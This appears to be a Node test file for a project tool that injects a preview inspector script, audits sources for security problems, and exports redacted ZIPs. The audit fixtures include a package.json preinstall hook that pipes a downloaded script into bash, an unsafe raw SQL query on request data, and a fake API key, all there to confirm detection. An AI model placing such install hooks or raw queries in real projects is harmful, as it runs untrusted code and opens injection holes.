import assert from "node:assert/strict";
import test from "node:test";
import JSZip from "jszip";
import { previewFiles, INSPECTOR_SCRIPT } from "../src/lib/inspect-bridge";
import { projectZip, reviewSources } from "../src/lib/project-review";

test("preview instrumentation adds a script to real body markup without changing source", () => {
  const layout =
    'export default function Layout({children}) {const label="</body>";return <html><body data-label={label}>{children}</body></html>}';
  const files = {
    "src/app/layout.tsx": layout,
    "public/__forge_preview_inspector.js": "user asset",
  };
  const preview = previewFiles(files);
  assert.equal(files["src/app/layout.tsx"], layout);
  assert.ok(
    preview["src/app/layout.tsx"].includes(
      '{children}<script src="/___forge_preview_inspector.js"',
    ),
  );
  assert.equal(
    preview["public/___forge_preview_inspector.js"],
    INSPECTOR_SCRIPT,
  );
  assert.equal(preview["public/__forge_preview_inspector.js"], "user asset");
});
test("audit detects vulnerable backend and dependency patterns without returning secret text", () => {
  const credential = "sk-ant-api03-" + "fixture".repeat(4);
  const result = reviewSources({
    "src/app/api/users/route.ts":
      "export async function POST(req){const data=await req.json();return db.$queryRawUnsafe(data.sql);}",
    ".env": "KEY=" + credential,
    "package.json": JSON.stringify({
      dependencies: { lib: "*" },
      scripts: { preinstall: "curl https://example.org/install.sh | bash" },
    }),
  });
  for (const label of [
    "Check incoming data",
    "Unsafe SQL method",
    "Possible embedded credential",
    "Install script downloads code",
    "Check write permissions",
    "Review dependency lib",
  ])
    assert.ok(
      result.some((f) => f.check === label),
      label,
    );
  assert.ok(!JSON.stringify(result).includes(credential));
});
test("full-source ZIP has relative paths, usable SQLite config and redacted private values", async () => {
  const files = {
    "src/app/page.tsx": "const markup = '<p>hello</p>';",
    "prisma/schema.prisma": "generator client {}",
    "package.json": "{}",
    ".env": 'DATABASE_URL="file:./dev.db"\nTHIRD_PARTY_KEY=fixture-secret\n',
    ".env.local": 'API_TOKEN="second-secret"',
  };
  const zip = await JSZip.loadAsync(await projectZip(files));
  for (const path of Object.keys(files)) assert.ok(zip.file(path), path);
  assert.equal(
    await zip.file(".env")!.async("string"),
    'DATABASE_URL="file:./dev.db"\nTHIRD_PARTY_KEY=\n',
  );
  assert.equal(await zip.file(".env.local")!.async("string"), "API_TOKEN=\n");
  assert.equal(
    await zip.file("src/app/page.tsx")!.async("string"),
    files["src/app/page.tsx"],
  );
  await assert.rejects(
    projectZip({ "../secret": "hidden" }),
    /Unexpected path/,
  );
});
